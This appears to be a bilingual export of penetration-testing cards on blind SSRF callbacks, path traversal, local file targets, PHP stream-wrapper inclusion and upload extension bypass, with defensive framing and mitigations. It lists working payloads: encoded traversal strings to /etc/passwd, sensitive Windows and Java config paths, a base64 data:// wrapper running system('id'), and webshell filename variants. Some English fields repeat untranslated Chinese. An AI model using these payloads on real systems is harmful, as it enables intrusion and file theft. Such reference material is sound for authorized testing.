exploitation.zh: 先用正常外部 URL 记录请求基线，再逐条请求指向唯一标记端口的变体，保存原始 host、规范 host、DNS、socket 地址和监听日志。阳性要求监听器收到带请求令牌的应用流量；解析日志、超时或客户端访问不算。
exploitation.en: Record a normal external-URL baseline, then request each variant against the unique marker port while preserving raw host, canonical host, DNS, socket address, and listener logs. A positive requires the listener to receive application traffic with the request token; parse logs, timeouts, and client access do not count.

mitigation.zh: 使用单一标准 URL 解析器，解析全部地址后阻断回环、未指定、链路本地、私网和保留网段，并把连接固定到已批准 IP；对重定向和 DNS 重解析重复同样检查。
mitigation.en: 使用单一标准 URL 解析器，解析全部地址后阻断回环、未指定、链路本地、私网和保留网段，并把连接固定到已批准 IP；对重定向和 DNS 重解析重复同样检查。

name.zh: SSRF 带外回调关联验证

description.zh: 保留原始外部主机 URL，用于说明如何以自有唯一令牌域替换静态第三方名称并关联服务端 DNS/HTTP 回调。
description.en: 保留原始外部主机 URL，用于说明如何以自有唯一令牌域替换静态第三方名称并关联服务端 DNS/HTTP 回调。

prerequisites.zh: 测试者控制权威 DNS 与 HTTPS 回调端点，并能为每个请求签发不可复用令牌
prerequisites.en: The tester controls authoritative DNS and an HTTPS callback endpoint and can issue a nonreusable token for each request.

prerequisites.zh: 原始 burpcollaborator.net 主机不会直接请求，应用请求 ID 与回调时间窗已定义
prerequisites.en: The original burpcollaborator.net host will not be requested directly, and the application request ID and callback time window are defined.

title.zh: 静态带外主机样例

description.zh: 该原始静态域仅供追溯。执行时必须替换为 `<request-id>.<owned-zone>` 并优先使用 HTTPS，禁止向不受控第三方发送请求。
description.en: This original static domain is retained only for traceability. Replace it with <request-id>.<owned-zone> and prefer HTTPS during execution; never send requests to an uncontrolled third party.

analysis.zh: 最强证据是唯一令牌对应的应用源 HTTP/TLS 请求，并能和同一提交 ID 关联。仅有 DNS、公共静态域日志、非唯一令牌或操作者浏览器请求无法确认盲 SSRF；必须标注证据层级。
analysis.en: The strongest evidence is an application-origin HTTP or TLS request carrying the unique token and correlated to the same submission ID. DNS alone, public static-domain logs, nonunique tokens, or operator-browser requests cannot confirm blind SSRF; the evidence layer must be stated.

opsecTips.zh: 每次只签发一个短期域名并限制单次 DNS/HTTP 事件；收到应用源回调即停止
opsecTips.en: Issue one short-lived domain per run and limit it to a single DNS or HTTP event; stop when an application-origin callback arrives.

opsecTips.zh: 测试结束撤销 DNS、TLS 证书路由和令牌映射，按保留策略清理包含出口地址的日志
opsecTips.en: At completion revoke DNS, TLS certificate routing, and token mappings, and clean logs containing egress addresses under the retention policy.

title.zh: 签发一次性回调令牌

description.zh: 把随机子域绑定到应用请求 ID、操作者和短时间窗，并清空此前日志基线。
description.en: Bind a random subdomain to the application request ID, operator, and short time window, and clear the prior log baseline.

title.zh: 替换静态域并单次提交
title.en: Replace the static domain and submit once

description.zh: 保持 URL 输入位置不变，仅将原始域替换为自有令牌域，且不触发第二次请求。
description.en: Keep the URL input location unchanged, replace only the original domain with the controlled token domain, and do not trigger a second request.

attackChain.payload: http://spoofed.burpcollaborator.net

title.zh: 关联 DNS、TLS 与 HTTP 事件
title.en: Correlate DNS, TLS, and HTTP events

description.zh: 按令牌、时间、出口地址和协议层关联证据，排除操作者客户端与自动扫描。
description.en: Correlate evidence by token, time, egress address, and protocol layer while excluding operator clients and automated scanners.

title.zh: 阻断任意出站并撤销令牌
title.en: Block arbitrary egress and revoke the token

description.zh: 应用允许列表与出站控制后重放一次，确认无回调，再使子域失效并删除临时日志。
description.en: After applying allowlists and egress controls, replay once to confirm no callback, then invalidate the subdomain and remove temporary logs.

overview.zh: 带外验证适用于应用不返回获取结果但可能仍发起 DNS 或 HTTP 的场景。静态公共域无法可靠归因，必须用每请求唯一、自有且可审计的名称替换。
overview.en: Out-of-band validation applies when an application may issue DNS or HTTP traffic without returning the fetched content. A static public domain cannot be attributed reliably and must be replaced by a unique, controlled, auditable name per request.

vulnerability.zh: 若用户 URL 能驱动服务端解析或连接任意外部主机，盲 SSRF 可通过回调证实。只有 DNS 查询时可能是预解析、安全扫描器或中间件行为，HTTP/TLS 回调及应用来源更接近完整证据。
vulnerability.en: If a user URL can drive the server to resolve or connect to an arbitrary external host, blind SSRF can be confirmed by callbacks. DNS alone may come from pre-resolution, a security scanner, or middleware; HTTP or TLS callbacks from the application source provide stronger evidence.

exploitation.zh: 为单次应用请求生成随机子域并记录请求 ID、提交时间和预期窗口，随后关联权威 DNS、TLS 与 HTTP 日志。阳性至少要求令牌唯一且来源属于应用出口；本地浏览器解析、邮件扫描或旧令牌重放必须剔除。
exploitation.en: Generate a random subdomain for one application request and record its request ID, submission time, and expected window, then correlate authoritative DNS, TLS, and HTTP logs. A positive requires a unique token and an application egress source; local-browser resolution, mail scanning, and stale-token replay must be excluded.

mitigation.zh: 获取功能采用目的地主机允许列表、解析后 IP 分类、重定向复检和受限出站代理；不需要联网的工作负载禁止外连。保留回归域验证合法业务目标可达而任意令牌域不可达。
mitigation.en: Use destination-host allowlists, post-resolution IP classification, redirect revalidation, and a restricted egress proxy for retrieval features; deny egress for workloads that do not need it. Keep a regression zone to prove approved business targets remain reachable while arbitrary token domains do not.

name.zh: 路径遍历编码与分隔符变体
name.en: Path Traversal Encoding and Separator Variants

description.zh: 使用双重编码、过长 UTF-8、空字节、重复点段和反斜杠测试文件路径在多层解码后的根目录约束。
description.en: Uses double encoding, overlong UTF-8, null bytes, repeated dot segments, and backslashes to test root enforcement after multilayer path decoding.

prerequisites.zh: 目标参数参与服务端文件读取、下载、解压或模板路径选择
prerequisites.en: 目标参数参与服务端文件读取、下载、解压或模板路径选择

prerequisites.zh: 测试根目录外准备无敏感标记文件并启用文件访问审计
prerequisites.en: A nonsensitive marker outside the test root and file-access auditing are available.

title.zh: 路径解码差异样例

description.zh: 逐条替换目标路径参数，并把系统文件改为隔离标记；记录每个代理、框架和文件 API 看到的解码值。
description.en: Substitute each line into the path parameter, replace system files with an isolated marker, and record decoded values at every proxy, framework, and file API.

analysis.zh: 报告应同时给出原始值、完全解码值、规范绝对路径和实际文件操作。仅证明 WAF 与应用解码不同，还不能证明目录越界。
analysis.en: Report raw value, fully decoded value, canonical absolute path, and actual file operation. A WAF/application decoding difference alone does not prove directory escape.

opsecTips.zh: 所有敏感路径替换为隔离标记，禁止读取真实账户、日志和配置文件。
opsecTips.en: Replace every sensitive path with an isolated marker and do not read real account, log, or configuration files.

opsecTips.zh: 按目标平台选择有限变体并限速，避免大量无关错误污染日志。
opsecTips.en: Choose a small platform-specific set and rate-limit it to avoid irrelevant error-log noise.

title.zh: 记录合法文件路径基线

description.zh: 确认输入经过哪些解码层以及最终文件 API 的根目录和规范路径。
description.en: Identify decoding layers, the final file API root, and canonical path for a valid file.

title.zh: 逐条提交编码变体

description.zh: 把系统目标替换为目录外标记，逐条发送并记录各层路径。
description.en: Replace system targets with an out-of-root marker, send each line, and record paths at every layer.

attackChain.payload:
..\..\..\etc\passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%255c..%255c..%255cetc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%00/..%00/..%00/etc/passwd
....\....\....\etc\passwd
..%5c..%5c..%5cetc/passwd

title.zh: 确认最终路径越界

description.zh: 用规范路径、文件访问遥测或标记内容证明文件 API 越过允许根目录。
description.en: Use canonical path, file-access telemetry, or marker content to prove that the file API escaped the allowed root.

title.zh: 在文件 API 前强制根约束
title.en: Enforce the root before file access

description.zh: 修复后重放合法路径与全部编码变体，确认仅合法对象可访问。
description.en: After remediation replay valid paths and every encoding variant to confirm only allowed objects are accessible.

overview.zh: 路径遍历的关键不是原始输入是否包含 ../，而是所有解码与规范化完成后，文件 API 得到的真实路径是否离开允许根目录。不同平台对反斜杠、过长 UTF-8 和 NUL 的处理不同，应按实际技术栈逐条验证。
overview.en: 路径遍历的关键不是原始输入是否包含 ../，而是所有解码与规范化完成后，文件 API 得到的真实路径是否离开允许根目录。不同平台对反斜杠、过长 UTF-8 和 NUL 的处理不同，应按实际技术栈逐条验证。

vulnerability.zh: 根因是边界层在一次解码前过滤危险片段，而应用、路由器或文件库再次解码并折叠点段。若只检查字符串前缀而不比较规范绝对路径，编码分隔符和平台转换可能恢复父目录语义。
vulnerability.en: The cause is filtering dangerous fragments before one decode while the application, router, or file library decodes again and collapses dot segments. String-prefix checks without canonical absolute-path comparison let encoded separators and platform conversion restore parent traversal.

exploitation.zh: 用允许目录内文件建立基线，将每个样例的目标替换为目录外测试标记并逐条发送。关联原始输入、各层解码值、规范路径和文件访问日志。只有标记内容或越界文件访问成立；软 404、错误码和过滤告警不足。
exploitation.en: Baseline an allowed file, replace each sample target with a marker outside the root, and submit separately. Correlate raw input, each decoded value, canonical path, and file audit. Only marker content or an out-of-root read proves the issue; soft 404s, status changes, and filter alerts do not.

mitigation.zh: 用服务端对象 ID 映射文件而不是接受路径。必须处理路径时，完成全部解码后解析规范绝对路径，验证其严格位于固定根目录且不经符号链接越界；拒绝 NUL、未知编码和跨平台分隔符，并在文件 API 前最后校验。
mitigation.en: 用服务端对象 ID 映射文件而不是接受路径。必须处理路径时，完成全部解码后解析规范绝对路径，验证其严格位于固定根目录且不经符号链接越界；拒绝 NUL、未知编码和跨平台分隔符，并在文件 API 前最后校验。

name.zh: 敏感本地文件与应用配置路径
name.en: Sensitive Local File and Application Configuration Paths

description.zh: 按 Linux、Windows 与 Java Web 技术栈组织常见本地文件目标，用于确认文件读取边界及数据敏感度。
description.en: Organizes common Linux, Windows, and Java web local-file targets to confirm file-read boundaries and data sensitivity.

prerequisites.zh: 已通过无敏感标记确认存在文件读取数据流
prerequisites.en: A file-read data flow has already been confirmed with a nonsensitive marker.

prerequisites.zh: 测试授权明确允许按平台核对敏感文件边界
prerequisites.en: Authorization explicitly permits platform-specific sensitive-file boundary checks.

title.zh: 跨平台本地文件目标

execution.command:
/proc/cpuinfo
/var/log/apache/access.log
/var/log/syslog
/var/log/httpd/access_log
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
c:/windows/system32/drivers/etc/hosts
c:/windows/win.ini
c:/boot.ini
file:///c:/windows/win.ini
WEB-INF/web.xml
/WEB-INF/web.xml
WEB-INF/classes/application.properties

description.zh: 只选择与已确认操作系统和框架匹配的目标；优先改为同目录中的测试标记，真实文件仅用于授权后的最小元数据确认。
description.en: Select only targets matching the confirmed OS and framework; prefer same-directory test markers, using real files only for minimal metadata confirmation when explicitly authorized.

analysis.zh: 该卡用于影响确认而非发现阶段。成功证据应最小化为文件存在、固定非敏感片段或审计事件，并说明应用身份的实际读取范围。
analysis.en: This card is for impact confirmation, not discovery. Minimize evidence to existence, a fixed nonsensitive fragment, or an audit event and state the actual read scope of the application identity.

opsecTips.zh: 不下载完整日志或配置；截图和报告中遮盖所有令牌、主机名和个人数据。
opsecTips.en: Do not download full logs or configuration; redact tokens, hostnames, and personal data from evidence.

opsecTips.zh: 每个平台只验证一个最低敏感目标，取得结论后立即停止。
opsecTips.en: Verify one lowest-sensitivity target per platform and stop as soon as the conclusion is established.

title.zh: 用标记确认读取原语
title.en: Confirm the read primitive with a marker

description.zh: 在不读取真实数据的情况下证明服务端文件 API 可访问允许目录外标记。
description.en: Prove the server file API can access an out-of-root marker without reading real data.

title.zh: 选择平台匹配的最小目标

description.zh: 按已知操作系统和框架只选择一行，并限制为存在性或固定前缀验证。
description.en: Select one line for the known OS and framework and limit verification to existence or a fixed prefix.

attackChain.payload:
/proc/cpuinfo
/var/log/apache/access.log
/var/log/syslog
/var/log/httpd/access_log
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
c:/windows/system32/drivers/etc/hosts
c:/windows/win.ini
c:/boot.ini
file:///c:/windows/win.ini
WEB-INF/web.xml
/WEB-INF/web.xml
WEB-INF/classes/application.properties

title.zh: 评估应用权限暴露

description.zh: 关联访问审计，确认应用进程实际读取并对数据类型与敏感度分级。
description.en: Correlate access audit, confirm an actual process read, and classify the data type and sensitivity.

title.zh: 隔离文件权限并回归

description.zh: 实施对象映射与最小权限后，重放合法文件和匹配目标，确认越界读取被拒绝。
description.en: After object mapping and least privilege, replay valid files and matching targets to confirm out-of-bound reads are denied.

overview.zh: 文件目标清单用于在已确认文件读取后评估影响，不适合无差别扫描。不同平台路径能帮助判断应用进程可见的文件系统，但最小证据应优先使用测试标记，避免把真实日志、主机信息或配置带入报告。
overview.en: This target list assesses impact after a file-read primitive is confirmed and is not for indiscriminate scanning. Platform paths help identify the process-visible filesystem, but minimal evidence should use test markers to avoid collecting real logs, host data, or configuration.

vulnerability.zh: 根因是文件读取接口允许用户选择任意绝对或应用相对路径，并以应用权限返回内容。日志可含令牌，web.xml 与 application.properties 可含内部路由或密钥，系统文件可暴露主机信息。
vulnerability.en: The root cause is a file-read interface allowing arbitrary absolute or application-relative paths and returning content with process privileges. Logs may contain tokens, web.xml or application.properties may reveal routes or secrets, and system files disclose host details.

exploitation.zh: 先用专用标记证明任意读取，再根据已知平台选择一条最低敏感目标并只验证存在性、固定前缀或哈希，不保存完整内容。关联文件访问日志和响应。错误页包含路径或静态文档示例不算实际读取。
exploitation.en: First prove arbitrary read with a dedicated marker, then choose one lowest-sensitivity target for the known platform and verify only existence, a fixed prefix, or hash rather than retaining full content. Correlate file audit and response. Error pages containing a path or documentation examples are not file reads.

mitigation.zh: 将客户端输入映射到允许对象 ID，禁止绝对路径和任意相对路径；文件服务在最小权限沙箱中运行，不能读取应用配置与系统日志。对日志中的密钥脱敏并轮换任何已确认暴露的凭据。
mitigation.en: Map client input to allowed object IDs and reject absolute or arbitrary relative paths. Run file services in a least-privilege sandbox without access to configuration or system logs. Redact secrets from logs and rotate any credential proven exposed.

name.zh: PHP Stream Wrapper 文件包含

description.zh: 使用 php、data、zip 与 phar wrapper 验证文件包含或读取参数是否允许非文件流、归档成员和序列化元数据进入 PHP 处理链。
description.en: Uses php, data, zip, and phar wrappers to test whether inclusion or read parameters admit nonfile streams, archive members, or serialization metadata into PHP processing.

prerequisites.zh: 目标由 PHP 处理并存在文件读取、包含或归档访问参数
prerequisites.en: The target runs PHP and exposes a file-read, include, or archive-access parameter.

prerequisites.zh: 可在隔离测试实例中控制无敏感资源和归档文件
prerequisites.en: Nonsensitive resources and archives are controllable in an isolated test instance.

title.zh: PHP 流与归档 Wrapper

description.zh: 逐 wrapper、逐目标测试，并把系统文件、代码与归档全部替换为隔离的无害标记；data: 与 data:// 是不同解析路径。
description.en: Test one wrapper and target at a time and replace system files, code, and archives with harmless isolated markers; data: and data:// exercise different parsing paths.

analysis.zh: 应明确每行对应的 PHP API、配置前提与实际结果：源码读取、流解析、归档访问和代码解释是不同风险，不能合并评级。
analysis.en: State the PHP API, configuration prerequisite, and actual result for each line. Source read, stream parsing, archive access, and code interpretation are distinct risks and should not share one severity automatically.

opsecTips.zh: 使用只含固定标记的测试文件/归档，不读取配置或提交可执行系统命令。
opsecTips.en: Use test files and archives containing only fixed markers; do not read configuration or submit executable system commands.

opsecTips.zh: 每次只验证一个 wrapper，并在结束后删除上传的测试归档和请求体缓存。
opsecTips.en: Validate one wrapper at a time and remove uploaded test archives and request-body caches afterward.

title.zh: 识别 PHP 文件 API

description.zh: 确认输入进入读取、包含还是归档函数，并记录 PHP 配置与 wrapper 支持。
description.en: 确认输入进入读取、包含还是归档函数，并记录 PHP 配置与 wrapper 支持。

title.zh: 提交匹配的无害 Wrapper

description.zh: 把所有敏感目标和代码替换为测试标记，逐 wrapper 提交并关联日志。
description.en: Replace sensitive targets and code with test markers, submit one wrapper at a time, and correlate logs.

attackChain.payload:
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=config.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
zip://shell.jpg%23shell.php
phar://shell.phar/shell.php

title.zh: 确认实际流处理结果

description.zh: 通过标记输出、解码内容、归档成员访问或受控执行证明对应 wrapper 被后端处理。
description.en: Use marker output, decoded content, archive-member access, or controlled execution to prove backend wrapper handling.

title.zh: 限制 Wrapper 与包含边界

description.zh: 改用对象映射并关闭不需要的 wrapper 后重放，确认合法文件功能保留且所有样例拒绝。
description.en: After object mapping and disabling unnecessary wrappers, replay to preserve valid file behavior while rejecting every sample.

overview.zh: PHP Stream Wrapper 把文件 API 扩展到过滤器、请求体、内联数据和归档。每个 wrapper 的风险取决于函数是读取还是 include、配置是否允许 URL include，以及是否触发 phar 元数据处理；不能把 wrapper 字符串被接受直接等同于代码执行。
overview.en: PHP stream wrappers extend file APIs to filters, request bodies, inline data, and archives. Risk depends on read versus include behavior, URL-include settings, and phar metadata handling. Acceptance of a wrapper string does not itself mean code execution.

vulnerability.zh: 根因是用户输入直接进入 fopen、file_get_contents、include 或归档 API，且未限制 wrapper scheme 和目标。读取函数可能泄露源码，include 可能解释流内容，phar/zip 还可能跨入归档成员或对象元数据处理。
vulnerability.en: The root cause is user input reaching fopen, file_get_contents, include, or archive APIs without restricting wrapper scheme and target. Read functions can disclose source, include can interpret stream content, and phar or zip can cross into archive members or object metadata.

exploitation.zh: 先通过代码或日志确定具体 PHP API，再选择与该 API 匹配的一个 wrapper，使用无害标记文件、纯文本请求体或测试归档。观察标记读取、解码输出或受控无副作用执行。错误、回显 URI 或上传成功不能证明 wrapper 被处理。
exploitation.en: Identify the exact PHP API from code or logs, then choose one matching wrapper and use a harmless marker file, plain-text request body, or test archive. Observe marker reads, decoded output, or controlled side-effect-free execution. Errors, URI reflection, or upload success do not prove wrapper processing.

mitigation.zh: 不要把用户输入传给 include/require；读取文件时使用服务端对象映射和固定根目录，只允许明确的 file 资源。关闭不需要的 allow_url_include，限制上传目录不可执行，升级 PHP 与依赖，并审计 phar/zip 处理和反序列化路径。
mitigation.en: 不要把用户输入传给 include/require；读取文件时使用服务端对象映射和固定根目录，只允许明确的 file 资源。关闭不需要的 allow_url_include，限制上传目录不可执行，升级 PHP 与依赖，并审计 phar/zip 处理和反序列化路径。

name.zh: PHP 上传文件名与扩展名绕过
name.en: PHP Upload Filename and Extension Bypass

description.zh: 使用替代 PHP 扩展、双扩展、大小写、控制字符、分号、冒号与 NTFS ADS 变体，验证上传校验与 Web 服务器执行映射是否一致。
description.en: Uses alternative PHP extensions, double extensions, casing, controls, semicolons, colons, and NTFS ADS variants to test consistency between upload validation and web-server execution mapping.

subCategory.zh: 上传扩展名与文件名解析差异
subCategory.en: Upload Extension and Filename Parsing Differentials

prerequisites.zh: 目标允许上传文件并可观察最终存储名与服务方式
prerequisites.en: The target permits uploads and exposes the final stored name and serving behavior.

prerequisites.zh: 隔离实例使用无害文本标记而非 WebShell 作为文件内容
prerequisites.en: An isolated instance uses harmless text markers rather than webshell content.

title.zh: PHP 文件名变体

execution.command:
shell.php5
shell.phtml
shell.pht
shell.php.jpg
shell.php.png
shell.php%00.jpg
shell.php%00.png
shell.php;.jpg
shell.php;.png
shell.php%0a
shell.php%0d%0a
shell.php.jpg.php
shell.php.png.php
shell.pHp
shell.PHP
shell.pHP5
shell.php:.jpg
shell.php:.png
shell.php::$DATA
shell.php::$DATA%00

description.zh: 逐文件名上传同一无害文本标记，记录入口校验名、规范存储名、响应 Content-Type 和是否落入可执行处理器。
description.en: Upload the same harmless text marker under each filename and record validated name, canonical stored name, response Content-Type, and whether an executable handler is selected.

analysis.zh: 上传成功、文件可访问和代码可执行是三个不同阶段。报告必须给出最终规范文件名、存储位置与处理器证据，不能从扩展名推断执行。
analysis.en: Upload acceptance, file accessibility, and code execution are separate stages. Report the final canonical name, storage location, and handler evidence rather than inferring execution from an extension.

opsecTips.zh: 测试内容只能是无害文本或服务器端固定标记，不上传 WebShell 或命令执行代码。
opsecTips.en: 测试内容只能是无害文本或服务器端固定标记，不上传 Web Shell 或命令执行代码。

opsecTips.zh: 每个测试文件完成后立即删除，并确认 CDN、对象存储和备份中无残留。
opsecTips.en: Delete each test file immediately afterward and verify no residue remains in CDN, object storage, or backups.

title.zh: 记录安全上传基线

description.zh: 上传无害文本或图片，记录原始名、规范名、磁盘位置和下载处理器。
